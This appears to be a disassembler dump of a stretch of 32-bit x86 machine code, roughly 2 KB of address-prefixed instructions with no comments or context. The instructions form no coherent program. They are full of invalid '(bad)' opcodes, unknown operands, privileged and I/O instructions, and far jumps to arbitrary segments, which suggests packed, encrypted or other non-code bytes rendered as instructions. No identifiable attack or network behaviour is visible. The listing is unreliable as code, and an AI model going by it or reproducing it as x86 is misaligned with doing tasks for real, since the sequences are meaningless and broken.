  4266a4:	add    eax,0x82eec5d3
  4266a9:	cmp    cl,BYTE PTR [eax+0xbf2f556]
  4266af:	loop   0x426651
  4266b1:	pusha  
  4266b2:	dec    edx
  4266b3:	cdq    
  4266b4:	push   cs
  4266b5:	dec    edi
  4266b6:	int3   
  4266b7:	shr    BYTE PTR [ebx],0x84
  4266ba:	pop    edi
  4266bb:	xchg   edx,eax
  4266bc:	push   ds
  4266bd:	ja     0x42665f
  4266bf:	push   ds
  4266c0:	cwde   
  4266c1:	stos   BYTE PTR es:[edi],al
  4266c2:	(bad)  
  4266c3:	xchg   edi,eax
  4266c4:	dec    ebp
  4266c5:	scas   eax,DWORD PTR es:[edi]
  4266c6:	dec    ebp
  4266c7:	ins    DWORD PTR es:[edi],dx
  4266c8:	sbb    eax,0x319f62ad
  4266cd:	add    eax,DWORD PTR [eax+0x7ea10494]
  4266d3:	shl    DWORD PTR [esi+ebx*2],1
  4266d6:	cmp    eax,0x425e5803
  4266db:	ret    0x1929
  4266de:	jg     0x426748
  4266e0:	mov    cl,BYTE PTR [edi+0x14]
  4266e3:	jne    0x4266cb
  4266e5:	shl    DWORD PTR [edi+0x35a61ad2],1
  4266eb:	int3   
  4266ec:	jp     0x426767
  4266ee:	ret    
  4266ef:	push   edi
  4266f0:	sub    BYTE PTR [eax-0x2ea6e0d1],0xe2
  4266f7:	dec    edx
  4266f8:	xor    eax,0x939329c8
  4266fd:	icebp  
  4266fe:	adc    al,0xb5
  426700:	jbe    0x4266d6
  426702:	inc    eax
  426703:	addr16 xchg edx,eax
  426705:	lock jbe 0x4266c8
  426708:	popf   
  426709:	imul   esp,DWORD PTR [ebx+0x579248f0],0x82ce274
  426713:	cmp    DWORD PTR [ecx-0x40],edx
  426716:	adc    BYTE PTR [edx-0x5e1b7c74],bh
  42671c:	test   BYTE PTR [ebx+ebp*4+0x71a52c41],bl
  426723:	enter  0xae51,0xc1
  426727:	jg     0x42671a
  426729:	sub    ecx,DWORD PTR [edx]
  42672b:	(bad)  
  42672c:	es sub eax,0xf59825f8
  426732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426733:	mov    ds:0x6ce15e54,eax
  426738:	call   0x5cbdf594
  42673d:	push   ds
  42673e:	mov    dl,0xda
  426740:	mov    ds:0xe28b7e19,al
  426745:	aam    0x54
  426747:	add    DWORD PTR [edx],ebx
  426749:	popf   
  42674a:	call   0x510a:0x66182dd3
  426751:	loop   0x42674e
  426753:	sub    esi,DWORD PTR ds:0x7f7ebde
  426759:	jbe    0x4267c6
  42675b:	dec    edx
  42675c:	sub    DWORD PTR [esi-0x42f7aae5],eax
  426762:	jge    0x426728
  426764:	in     eax,dx
  426765:	mov    ecx,0xa91a0383
  42676a:	pop    es
  42676b:	inc    edx
  42676c:	call   0x58a1:0x18320bf4
  426773:	sbb    al,0x22
  426775:	sbb    DWORD PTR [eax-0x58],edi
  426778:	loope  0x426727
  42677a:	rol    BYTE PTR [eax+0x2b],cl
  42677d:	add    al,0xbf
  42677f:	stc    
  426780:	mov    DWORD PTR [ebx-0x2b],edi
  426783:	mov    ds:0xc2ec3552,eax
  426788:	int3   
  426789:	jno    0x42674d
  42678b:	inc    DWORD PTR [esi-0x28]
  42678e:	std    
  42678f:	adc    edi,DWORD PTR [eax]
  426791:	inc    ebx
  426792:	xchg   edi,eax
  426793:	cmc    
  426794:	jns    0x4267a3
  426796:	and    BYTE PTR [ecx-0x6f],0xfc
  42679a:	dec    ecx
  42679b:	sbb    BYTE PTR [ebx-0x35],cl
  42679e:	data16 add al,0x42
  4267a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267a2:	mov    ah,0xea
  4267a4:	retf   0xe76c
  4267a7:	cld    
  4267a8:	mov    bl,0x40
  4267aa:	mov    eax,ds:0xaffa98f4
  4267af:	je     0x42678d
  4267b1:	mov    eax,ds:0x8de05a93
  4267b6:	inc    ebx
  4267b7:	mov    ecx,0x5bf7081c
  4267bc:	inc    eax
  4267bd:	data16 stc 
  4267bf:	inc    ebx
  4267c0:	div    ebx
  4267c2:	or     edx,edx
  4267c4:	(bad)  
  4267c5:	push   ecx
  4267c6:	xor    DWORD PTR [eax-0x1],ecx
  4267c9:	repnz sahf 
  4267cb:	xchg   ebp,eax
  4267cc:	in     eax,dx
  4267cd:	pusha  
  4267ce:	cs xor al,0x2b
  4267d1:	mov    esi,esi
  4267d3:	jb     0x426807
  4267d5:	mov    ch,0xc5
  4267d7:	ret    
  4267d8:	mov    ds:0x3a70cf4f,eax
  4267dd:	push   ecx
  4267de:	dec    BYTE PTR [ecx]
  4267e0:	cli    
  4267e1:	mov    cl,0xe1
  4267e3:	jmp    0xfb79:0x29bf1c55
  4267ea:	push   ds
  4267eb:	add    ah,BYTE PTR [ecx]
  4267ed:	sbb    bh,BYTE PTR [ebp+0x58e05d81]
  4267f3:	or     BYTE PTR [eax],cl
  4267f5:	xlat   BYTE PTR ds:[ebx]
  4267f6:	(bad)  
  4267f8:	push   ebx
  4267f9:	je     0x4267cd
  4267fb:	cmp    BYTE PTR [ebp-0x7d9ae737],bl
  426801:	pushf  
  426802:	cld    
  426803:	bound  eax,QWORD PTR [edi+0x725d66d1]
  426809:	sub    ebx,DWORD PTR [ecx+0x3b]
  42680c:	sub    DWORD PTR [ebx],0x4c
  42680f:	mov    esp,0xf7f0a22
  426814:	sbb    esp,DWORD PTR [ebx]
  426816:	test   al,0x38
  426818:	stos   DWORD PTR es:[edi],eax
  426819:	out    dx,eax
  42681a:	adc    DWORD PTR [ebx],esp
  42681c:	lahf   
  42681d:	mov    ebx,0xbd01f83f
  426822:	pop    es
  426823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426824:	ror    BYTE PTR [ebx+0xb],1
  426827:	call   0x789b88ca
  42682c:	cmp    BYTE PTR [esi+0x39],0xb0
  426830:	sbb    DWORD PTR [ecx+0x73017095],edi
  426836:	loop   0x4267f5
  426838:	cmc    
  426839:	jae    0x4267e7
  42683b:	push   0xf96b510e
  426840:	imul   eax,DWORD PTR [edi-0x22],0xfffffff1
  426844:	mov    dl,0xd4
  426846:	aaa    
  426847:	xor    DWORD PTR [ebx+0x20],0x31a7c15d
  42684e:	sti    
  42684f:	dec    ebp
  426850:	rcl    DWORD PTR [edi+0x2573ef66],0x99
  426857:	lods   al,BYTE PTR ds:[esi]
  426858:	stos   BYTE PTR es:[edi],al
  426859:	or     al,0x62
  42685c:	pop    eax
  42685d:	imul   eax,DWORD PTR [ebx+esi*1],0xffffffd7
  426861:	js     0x426892
  426863:	in     al,0x6d
  426865:	psllw  mm3,QWORD PTR [eax]
  426868:	mov    WORD PTR [ebx-0x2c],?
  42686b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42686c:	fwait
  42686d:	mov    ebx,0xed98ec89
  426872:	int3   
  426873:	push   edx
  426874:	cli    
  426875:	scas   eax,DWORD PTR es:[edi]
  426876:	ficom  DWORD PTR cs:[ecx-0x3a06abd1]
  42687d:	loope  0x4268a5
  42687f:	test   al,0x68
  426881:	jne    0x4268ab
  426883:	mov    esp,0x7e2dc4cd
  426888:	mov    eax,ds:0xe5877bbf
  42688d:	jg     0x42688f
  42688f:	(bad)  
  426890:	mov    ecx,0xd0c58b98
  426895:	and    al,0xd5
  426897:	je     0x426858
  426899:	out    0xab,al
  42689b:	iret   
  42689c:	(bad)  
  42689d:	test   cl,0x86
  4268a0:	xchg   ecx,eax
  4268a1:	push   edx
  4268a2:	adc    al,0x67
  4268a4:	sbb    BYTE PTR [esi-0x37],ch
  4268a7:	adc    al,0x42
  4268a9:	outs   dx,DWORD PTR ds:[esi]
  4268aa:	add    ebx,DWORD PTR [edx]
  4268ac:	mov    ?,WORD PTR [edi-0x530635e1]
  4268b2:	sub    al,0xce
  4268b4:	arpl   bx,di
  4268b6:	xchg   edi,eax
  4268b7:	adc    edi,DWORD PTR [esi]
  4268b9:	cmp    al,ch
  4268bb:	lods   al,BYTE PTR ds:[esi]
  4268bc:	push   edi
  4268bd:	cmp    eax,0xc6043e19
  4268c2:	and    al,0x31
  4268c5:	add    eax,0xe81e064
  4268ca:	out    0xf,al
  4268cc:	mov    cl,0xb4
  4268ce:	retf   0xc376
  4268d1:	cld    
  4268d2:	callw  0x92d4
  4268d6:	jno    0x426914
  4268d8:	dec    ebp
  4268d9:	cmc    
  4268da:	stc    
  4268db:	xchg   ebp,eax
  4268dc:	sbb    BYTE PTR [eax],dl
  4268de:	mov    al,0x2
  4268e0:	lea    edi,[edx]
  4268e2:	push   es
  4268e3:	xchg   ecx,eax
  4268e4:	test   DWORD PTR [ebp-0x31],ebp
  4268e7:	sub    eax,0x649830ab
  4268ec:	mov    ebx,0x37ccaff6
  4268f1:	cmp    al,0xe9
  4268f3:	test   al,0x47
  4268f5:	or     ebx,DWORD PTR [eax]
  4268f7:	cmp    BYTE PTR [eax+0x5fefba8d],0x79
  4268fe:	les    edx,FWORD PTR [eax+0x47e63c04]
  426904:	not    BYTE PTR [ebx+0x7532df43]
  42690a:	xor    bh,BYTE PTR [ebx]
  42690c:	push   eax
  42690d:	arpl   ax,sp
  42690f:	outs   dx,BYTE PTR ds:[esi]
  426910:	je     0x426980
  426912:	sti    
  426913:	push   edi
  426914:	mov    al,0xec
  426916:	mov    cs,WORD PTR [edx+esi*1]
  426919:	stc    
  42691a:	add    esp,DWORD PTR [esi]
  42691c:	adc    DWORD PTR [esi+0xb52fb1e],edi
  426922:	ins    DWORD PTR es:[edi],dx
  426923:	and    ebp,DWORD PTR [esi]
  426925:	daa    
  426926:	and    al,0x70
  426928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426929:	adc    eax,DWORD PTR [esi+0x58]
  42692c:	int3   
  42692d:	shl    ah,cl
  42692f:	lods   al,BYTE PTR ds:[esi]
  426930:	jae    0x4268f5
  426932:	pop    ecx
  426933:	xchg   DWORD PTR [esi],esi
  426935:	pushf  
  426936:	cs push es
  426938:	int    0x46
  42693a:	push   0x65882cc7
  42693f:	add    BYTE PTR [edx],0x6f
  426942:	or     ecx,esi
  426944:	sbb    al,0x95
  426946:	popf   
  426947:	fadd   DWORD PTR [ecx]
  426949:	dec    esp
  42694a:	pop    eax
  42694b:	mov    bh,0xce
  42694d:	jle    0x426970
  42694f:	rol    DWORD PTR [edi-0x1c],cl
  426952:	aad    0x9a
  426954:	in     al,0x48
  426956:	sbb    dh,bh
  426958:	dec    esp
  426959:	jmp    0xe9cf:0xc1b42242
  426960:	ret    
  426961:	xor    BYTE PTR [edx+eax*8-0x23621218],0x24
  426969:	jns    0x4269d6
  42696b:	inc    ebp
  42696c:	pop    eax
  42696d:	mov    ds:0x50ec5a,al
  426972:	sbb    esp,DWORD PTR [edi+0x29]
  426975:	icebp  
  426976:	pop    eax
  426977:	scas   al,BYTE PTR es:[edi]
  426978:	les    edx,FWORD PTR [eax]
  42697a:	push   esp
  42697b:	addr16 (bad) 
  42697d:	cmp    BYTE PTR [ebp-0x15de5539],bh
  426983:	das    
  426984:	fld    QWORD PTR [edx]
  426986:	xchg   esp,eax
  426987:	mov    dh,0xae
  426989:	pop    eax
  42698a:	push   0xffffffd5
  42698c:	cld    
  42698d:	add    BYTE PTR [edi],bh
  42698f:	or     BYTE PTR [esi+0x74],dl
  426992:	test   al,0x57
  426994:	lods   al,BYTE PTR ds:[esi]
  426995:	xchg   ebx,eax
  426996:	cmp    dh,BYTE PTR [esi+0x7a]
  426999:	imul   ecx,edx,0x2c1fb788
  42699f:	xchg   ebp,eax
  4269a0:	push   esi
  4269a1:	cmp    ch,BYTE PTR [edx-0x70]
  4269a4:	gs xor eax,0x72190867
  4269aa:	inc    ebx
  4269ab:	xor    eax,0x60944697
  4269b0:	add    ah,bl
  4269b2:	mov    ch,0x17
  4269b4:	mov    eax,0xa823f7ce
  4269b9:	out    dx,al
  4269ba:	loope  0x4269b4
  4269bc:	sbb    eax,0x3e3ffca
  4269c1:	push   ecx
  4269c2:	mov    eax,ds:0x391be91e
  4269c7:	cvtdq2ps xmm7,XMMWORD PTR [edx+0x573c0bf3]
  4269ce:	push   ss
  4269cf:	pop    esp
  4269d0:	adc    BYTE PTR [ebx-0x13ce6065],bl
  4269d6:	popf   
  4269d7:	cmp    BYTE PTR [edx],dh
  4269d9:	push   es
  4269da:	outs   dx,DWORD PTR ds:[esi]
  4269db:	(bad)
  4269df:	inc    edx
  4269e0:	(bad)  
  4269e1:	xor    eax,0x1171f34
  4269e6:	jg     0x426976
  4269e8:	inc    ebx
  4269e9:	pop    edx
  4269ea:	and    edx,ebx
  4269ec:	arpl   WORD PTR [esp+edx*1-0x5ff3548f],ax
  4269f3:	mov    edi,0xd1b8a33
  4269f8:	ins    DWORD PTR es:[edi],dx
  4269f9:	mov    ?,WORD PTR [edi+ebp*2]
  4269fc:	dec    esp
  4269fd:	mov    dl,BYTE PTR [edx-0x35c23110]
  426a03:	inc    ecx
  426a04:	cwde   
  426a05:	push   esi
  426a06:	mov    esp,0x3acedf8
  426a0b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a0d:	pop    edx
  426a0e:	popf   
  426a0f:	jle    0x426a0e
  426a11:	cmp    eax,0x80a84996
  426a16:	jmp    0x90e1c7a
  426a1b:	jo     0x4269db
  426a1d:	dec    ecx
  426a1e:	jge    0x4269d2
  426a20:	mov    dh,0xbb
  426a22:	pop    edx
  426a23:	fist   WORD PTR [ebx+0x18bf0ab4]
  426a29:	ret    
  426a2a:	or     esp,DWORD PTR [esi*1+0x712f62d5]
  426a31:	cmp    BYTE PTR [edx+0x46b13f97],al
  426a37:	mov    eax,ds:0xa19955a7
  426a3c:	or     DWORD PTR [ebx-0x12],0xffffffd2
  426a40:	cld    
  426a41:	nop
  426a42:	iret   
  426a43:	out    dx,al
  426a44:	mov    DWORD PTR [ebx+eax*4+0x2e831344],edi
  426a4b:	ret    
  426a4c:	mov    al,ds:0x6b63dea0
  426a51:	pusha  
  426a52:	adc    ecx,edx
  426a54:	inc    ebp
  426a55:	aas    
  426a56:	ror    ah,0x35
  426a59:	hlt    
  426a5a:	mov    al,ds:0xc0927323
  426a5f:	xor    cl,bl
  426a61:	mov    WORD PTR [ebx+0x70a7fea6],ss
  426a67:	push   ecx
  426a68:	cwde   
  426a69:	repz pop ebp
  426a6b:	mov    bh,BYTE PTR [edi+0x26e9de6f]
  426a71:	sbb    edx,DWORD PTR [esi+0x28]
  426a74:	lock (bad) 
  426a76:	(bad)
  426a79:	frstor [eax]
  426a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a7c:	les    ebp,FWORD PTR [edi-0x31e5d198]
  426a82:	les    esp,FWORD PTR [ecx-0x67]
  426a85:	jg     0x426af3
  426a87:	mov    ah,0xe8
  426a89:	add    ah,ch
  426a8b:	adc    al,0xa0
  426a8d:	lods   al,BYTE PTR ds:[esi]
  426a8e:	or     esi,DWORD PTR [edx]
  426a90:	shl    edx,1
  426a92:	add    al,0xb
  426a94:	push   edi
  426a95:	cs cld 
  426a97:	sbb    bl,BYTE PTR [ecx+edi*2]
  426a9a:	fld    DWORD PTR [ecx-0x21]
  426a9d:	fisttp WORD PTR [eax+eiz*4+0x77]
  426aa1:	daa    
  426aa2:	push   esi
  426aa3:	mov    eax,0x56b0d440
  426aa8:	out    dx,eax
  426aa9:	sbb    edi,DWORD PTR [ecx+0x632a152a]
  426aaf:	mov    dh,0xc1
  426ab1:	mov    eax,ds:0x51591df3
  426ab6:	in     al,dx
  426ab7:	aas    
  426ab8:	mov    eax,DWORD PTR [eax]
  426aba:	cmp    dl,BYTE PTR [eax-0x1d]
  426abd:	into   
  426abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426abf:	jle    0x426b37
  426ac1:	cmc    
  426ac2:	mov    bh,0x98
  426ac4:	ins    DWORD PTR es:[edi],dx
  426ac5:	fsubr  DWORD PTR [edi-0x42]
  426ac8:	fisubr WORD PTR [esi]
  426aca:	or     dl,dh
  426acc:	dec    ecx
  426acd:	scas   eax,DWORD PTR es:[edi]
  426ace:	dec    ecx
  426acf:	addr16 xchg ecx,eax
  426ad1:	pop    ebp
  426ad2:	stos   DWORD PTR es:[edi],eax
  426ad3:	addr16 sahf 
  426ad5:	inc    esi
  426ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ad7:	aad    0xde
  426ad9:	mov    ebp,0xb73ceaa6
  426ade:	popf   
  426adf:	fist   DWORD PTR [edx-0x1b]
  426ae2:	fld    QWORD PTR [ebx-0x1b74829f]
  426ae8:	out    dx,al
  426ae9:	enter  0xa3e3,0x79
  426aed:	pop    ecx
  426aee:	jb     0x426a7f
  426af0:	out    dx,al
  426af1:	and    BYTE PTR [edx-0xb],dl
  426af4:	sub    edi,esi
  426af6:	lahf   
  426af7:	push   0x2d00ebb2
  426afc:	es cmp eax,0x441eef72
  426b02:	jae    0x426a9f
  426b04:	(bad)  
  426b05:	outs   dx,DWORD PTR ds:[esi]
  426b06:	arpl   si,dx
  426b08:	stc    
  426b09:	pop    esp
  426b0a:	ret    
  426b0b:	stc    
  426b0c:	aas    
  426b0d:	iret   
  426b0e:	dec    ebx
  426b0f:	push   edi
  426b10:	jne    0x426b41
  426b12:	jge    0x426b67
  426b14:	int3   
  426b15:	xor    al,0x2f
  426b17:	adc    edx,ebx
  426b19:	push   cs
  426b1a:	call   0x6a2e:0x87608026
  426b21:	in     al,0x7a
  426b23:	icebp  
  426b24:	jne    0x426b41
  426b26:	fld    TBYTE PTR [eax+0x5af0e901]
  426b2c:	call   FWORD PTR [ecx+0x42]
  426b2f:	mov    bl,0xeb
  426b31:	not    BYTE PTR [esi+0x4cdf4303]
  426b37:	mov    dh,0xf6
  426b39:	mov    dl,ah
  426b3b:	fdivr  QWORD PTR [ecx]
  426b3d:	mov    ebx,0x2613fcbe
  426b42:	mov    ds:0x878d9017,al
  426b47:	xchg   ecx,eax
  426b48:	rol    cl,1
  426b4a:	sbb    ecx,DWORD PTR [ebp+0xf]
  426b4d:	pop    edx
  426b4e:	jecxz  0x426bcd
  426b50:	fwait
  426b51:	lea    edx,[esi+ecx*4-0xf]
  426b55:	(bad)  
  426b56:	dec    edi
  426b57:	loop   0x426adf
  426b59:	and    BYTE PTR [ecx+0x170673f9],dl
  426b5f:	sbb    ecx,edi
  426b61:	rol    BYTE PTR [ecx],1
  426b63:	scas   eax,DWORD PTR es:[edi]
  426b64:	pop    ss
  426b65:	xchg   ebx,eax
  426b66:	jns    0x426b63
  426b68:	xchg   esi,eax
  426b69:	ret    0x1bac
  426b6c:	xor    eax,DWORD PTR [esi+0x2c]
  426b6f:	dec    edx
  426b70:	xchg   esi,eax
  426b71:	lds    edx,FWORD PTR [eax+ecx*2+0x16]
  426b75:	fdiv   QWORD PTR [eax+ebp*1+0x364dad11]
  426b7c:	(bad)  
  426b7d:	gs icebp 
  426b7f:	mov    eax,0x88acf9c
  426b84:	jge    0x426b77
  426b86:	xor    DWORD PTR [edx+0x5647b3d3],esi
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0x8081,0xe5
  426b98:	cwde   
  426b99:	add    ch,BYTE PTR [eax-0x7]
  426b9c:	add    DWORD PTR [eax],eax
  426b9e:	mov    BYTE PTR [esi],al
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	push   ebx
  426ba3:	dec    esp
  426ba4:	sub    BYTE PTR [eax+edx*4+0x58bece79],0x52
  426bac:	mov    eax,0xfac7f7d3
  426bb1:	dec    esp
  426bb2:	aad    0x7
  426bb4:	(bad)  
  426bb5:	out    0xec,eax
  426bb7:	rcr    BYTE PTR [ebp+0x5d9dfea7],0x13
  426bbe:	pop    es
  426bbf:	rcl    BYTE PTR [edi+0x7],cl
  426bc2:	xchg   ecx,eax
  426bc3:	sahf   
  426bc4:	xor    edx,DWORD PTR [edx-0x197dfaaa]
  426bca:	add    DWORD PTR [ecx],0xffffffb5
  426bcd:	imul   esp,DWORD PTR [eax+ecx*1+0x7d],0x63d7dafc
  426bd5:	xchg   DWORD PTR ds:0x64e1ef5,ecx
  426bdb:	xor    BYTE PTR [edx],al
  426bdd:	pop    eax
  426bde:	and    al,cl
  426be0:	adc    BYTE PTR ds:0xa6a3b92b,cl
  426be6:	test   DWORD PTR [edx+0x53367448],edi
  426bec:	mov    bl,0x9
  426bee:	jg     0x426c28
  426bf0:	pop    ebx
  426bf1:	sub    BYTE PTR [eax+0x27a94d2b],ah
  426bf7:	es aaa 
  426bf9:	sub    ch,BYTE PTR [ebx+0x4efa1078]
  426bff:	ficom  DWORD PTR [edi+ebx*2+0x31]
  426c03:	sbb    BYTE PTR [ebx-0x1c],bh
  426c06:	sahf   
  426c07:	jl     0x426c6e
  426c09:	rcr    dl,0xb4
  426c0c:	sub    BYTE PTR [ebx+0x5a],ch
  426c0f:	and    dl,BYTE PTR [eax+edi*8-0x18]
  426c13:	inc    esi
  426c14:	xchg   ebp,eax
  426c15:	xchg   edx,eax
  426c16:	add    edi,edx
  426c18:	getsec 
  426c1a:	mov    fs,WORD PTR [ecx-0x9476073]
  426c20:	sbb    BYTE PTR [ecx+0x7154e43d],0xae
  426c27:	ret    0x5b
  426c2a:	and    dl,bl
  426c2c:	adc    DWORD PTR [esi],edx
  426c2e:	inc    ebx
  426c2f:	(bad)  
  426c30:	stos   DWORD PTR es:[edi],eax
  426c31:	jmp    0xfbf00c4e
  426c36:	hlt    
  426c37:	stos   BYTE PTR es:[edi],al
  426c38:	adc    ebx,ecx
  426c3a:	(bad)  
  426c3c:	nop
  426c3d:	cld    
  426c3e:	pop    eax
  426c3f:	mov    edi,0x8f4a604
  426c44:	(bad)  
  426c46:	push   edi
  426c47:	cmp    eax,0x41404d28
  426c4c:	jbe    0x426c73
  426c4e:	pop    esi
  426c4f:	jo     0x426be9
  426c51:	jno    0x426c85
  426c53:	out    0x63,al
  426c55:	dec    edx
  426c56:	sar    edx,cl
  426c58:	pop    ss
  426c59:	inc    ecx
  426c5a:	or     ch,BYTE PTR [esi+0x26d0d78b]
  426c60:	data16 ja 0x426c7c
  426c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c64:	push   0x741ca52b
  426c69:	mov    esi,DWORD PTR [esi-0x19]
  426c6c:	clc    
  426c6d:	arpl   WORD PTR [edx],di
  426c6f:	mov    bl,BYTE PTR ds:0x6884add3
  426c75:	arpl   WORD PTR [esi-0x73],dx
  426c78:	mov    esp,0xdfd5ac13
  426c7d:	mov    ebp,0x89d3797
  426c82:	pop    edi
  426c83:	pop    eax
  426c84:	mov    al,0x0
  426c86:	fld    TBYTE PTR [ebx+0x62]
  426c89:	or     ch,BYTE PTR [esp+ecx*1-0x2720c93a]
  426c90:	loopne 0x426c49
  426c92:	mov    eax,0x568ee76f
  426c97:	dec    esi
  426c98:	sbb    eax,0x346a0a0c
  426c9d:	xor    dl,BYTE PTR [esi-0x19]
  426ca0:	or     DWORD PTR [edx-0x4db32815],0x4
  426ca7:	add    DWORD PTR [esi],ecx
  426ca9:	icebp  
  426caa:	fdivr  DWORD PTR [esi]
  426cac:	sbb    edi,DWORD PTR [edx+0x2f]
  426caf:	and    BYTE PTR [eax+0x58],0xe2
  426cb3:	rcl    dh,cl
  426cb5:	and    bl,BYTE PTR [eax-0x7e]
  426cb8:	cmp    DWORD PTR [ebx+0x4e],0xe7fefec4
  426cbf:	add    al,0x40
  426cc1:	add    DWORD PTR [ebx+eiz*1+0x10],0x6c6c9fde
  426cc9:	and    al,0xe9
  426ccb:	out    0xca,eax
  426ccd:	push   ss
  426cce:	cdq    
  426ccf:	lahf   
  426cd0:	cmp    eax,0x8b77e55b
  426cd5:	xor    al,0x77
  426cd8:	pop    esi
  426cd9:	mov    eax,ds:0xa0c65d1a
  426cde:	jbe    0x426d04
  426ce0:	jl     0x426ce8
  426ce2:	fwait
  426ce3:	inc    edx
  426ce4:	imul   edi,DWORD PTR [esi-0x17],0x6a
  426ce8:	jmp    0xb768:0xc68db23c
  426cef:	and    al,0xb6
  426cf1:	idiv   edx
  426cf3:	lock sub bh,BYTE PTR [edi+eax*4]
  426cf7:	rcl    BYTE PTR [ebp-0x6ccf4511],cl
  426cfd:	punpckhwd mm6,QWORD PTR [edx-0x23]
  426d01:	xor    eax,0xce12a323
  426d06:	inc    ebp
  426d07:	add    DWORD PTR [ecx+0x68ccd841],0x94e6bbf6
  426d11:	sbb    DWORD PTR [esi+edi*2+0x2dc2bc28],esi
  426d18:	scas   eax,DWORD PTR es:[edi]
  426d19:	lea    edx,[edi+0x5a494c57]
  426d1f:	gs cdq 
  426d21:	iret   
  426d22:	inc    eax
  426d23:	mov    al,ds:0xea7faf35
  426d28:	scas   eax,DWORD PTR es:[edi]
  426d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d2a:	push   esp
  426d2b:	push   edi
  426d2c:	sbb    ah,0x1
  426d2f:	add    eax,0x6bad0bdb
  426d34:	rol    BYTE PTR [esp+esi*1],0x63
  426d38:	jmp    0x89f4:0x7bbb80c8
  426d3f:	mov    bh,0x37
  426d41:	cmp    al,BYTE PTR [ebp-0x6ef86745]
  426d47:	icebp  
  426d48:	adc    dl,BYTE PTR [ebp+0xa]
  426d4b:	sub    al,0x5f
  426d4d:	test   DWORD PTR [edi+0x5b8f73ef],ebp
  426d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d54:	sbb    DWORD PTR [esi-0x3c],eax
  426d57:	cmp    DWORD PTR [esp+eiz*2],ebp
  426d5a:	mov    dh,0x5
  426d5c:	and    ah,BYTE PTR [ecx]
  426d5e:	test   BYTE PTR [esi-0x6b],0xd2
  426d62:	sbb    al,0xc3
  426d64:	(bad)  
  426d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d67:	push   ebx
  426d68:	pop    edi
  426d69:	arpl   dx,bx
  426d6b:	nop
  426d6c:	cmp    ch,BYTE PTR [ebx+eax*4]
  426d6f:	mov    ecx,0xbf08a2a9
  426d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d75:	sbb    cl,BYTE PTR [edi]
  426d77:	hlt    
  426d78:	dec    bh
  426d7a:	fs mov dh,0x86
  426d7d:	test   eax,0x30426f7c
  426d82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d83:	sbb    al,0xa8
  426d85:	nop
  426d86:	inc    ebp
  426d87:	dec    edi
  426d88:	inc    eax
  426d89:	jecxz  0x426dfe
  426d8b:	lds    esp,FWORD PTR [eax]
  426d8d:	sbb    edx,ecx
  426d8f:	mov    esp,0xfb36e495
  426d94:	outs   dx,DWORD PTR ds:[esi]
  426d95:	or     ah,BYTE PTR [esi-0x6c530918]
  426d9b:	lea    esi,fs:[ecx+0x44]
  426d9f:	rcl    DWORD PTR [ecx],cl
  426da1:	jns    0x426dc8
  426da3:	dec    esp
  426da4:	jmp    0x426d62
  426da6:	pop    ecx
  426da7:	mov    WORD PTR [ebx],gs
  426da9:	jmp    0x426dad
  426dab:	scas   al,BYTE PTR es:[edi]
  426dac:	in     eax,dx
  426dad:	(bad)  
  426dae:	aam    0xdb
  426db0:	mov    DWORD PTR [esi],ebx
  426db2:	pop    edx
  426db3:	jmp    0x426d3f
  426db5:	test   BYTE PTR [ebp-0x6c],bl
  426db8:	and    BYTE PTR [edx],bh
  426dba:	adc    eax,ecx
  426dbc:	lea    ebp,[edi-0x3e]
  426dbf:	shl    ah,cl
  426dc1:	sahf   
  426dc2:	fdivr  DWORD PTR [ecx]
  426dc4:	jmp    0x9afd6001
  426dc9:	outs   dx,BYTE PTR ds:[esi]
  426dca:	xchg   edx,eax
  426dcb:	int    0x4e
  426dcd:	sahf   
  426dce:	jg     0x426d55
  426dd0:	add    esp,eax
  426dd2:	add    eax,0x5d4be843
  426dd7:	add    DWORD PTR [eax-0x28],ecx
  426dda:	and    edx,DWORD PTR [edi]
  426ddc:	add    DWORD PTR [ebx+0x421bf3d8],edi
  426de2:	mov    WORD PTR [ebx-0x2c66cb24],?
  426de8:	mov    bh,0x4b
  426dea:	or     dh,ch
  426dec:	clc    
  426ded:	add    ch,BYTE PTR [ebp-0x7a]
  426df0:	cmp    DWORD PTR [esp+ebp*8+0x1d2e5f3f],0xffffff84
  426df8:	pop    ebx
  426df9:	aaa    
  426dfa:	sub    esp,DWORD PTR es:[ecx+0x36715668]
  426e01:	mov    edx,0xcbf14c11
  426e06:	sbb    ebx,0xffffffba
  426e09:	mov    ?,WORD PTR [ebx-0x2c]
  426e0c:	outs   dx,DWORD PTR ds:[esi]
  426e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e0e:	arpl   dx,di
  426e10:	bound  edi,QWORD PTR [edi-0x4b24ca1d]
  426e16:	pop    ebx
  426e17:	popf   
  426e18:	outs   dx,DWORD PTR ds:[esi]
  426e19:	cld    
  426e1a:	push   esi
  426e1b:	pop    ebx
  426e1c:	fisub  WORD PTR [ebp+0x4d84943b]
  426e22:	fdiv   DWORD PTR [edi+0x12c390cb]
  426e28:	push   edx
  426e29:	dec    ebp
  426e2a:	les    ebp,FWORD PTR [ebx-0x22]
  426e2d:	jb     0x426dd7
  426e2f:	push   ecx
  426e30:	call   DWORD PTR [eax-0x392f090b]
  426e36:	push   esp
  426e37:	mov    WORD PTR [edx],?
  426e39:	pop    edi
  426e3a:	scas   eax,DWORD PTR es:[edi]
  426e3b:	xchg   edx,eax
  426e3c:	push   cs
  426e3d:	fisub  DWORD PTR [ebp+0xdcdaffc]
  426e43:	ins    BYTE PTR es:[edi],dx
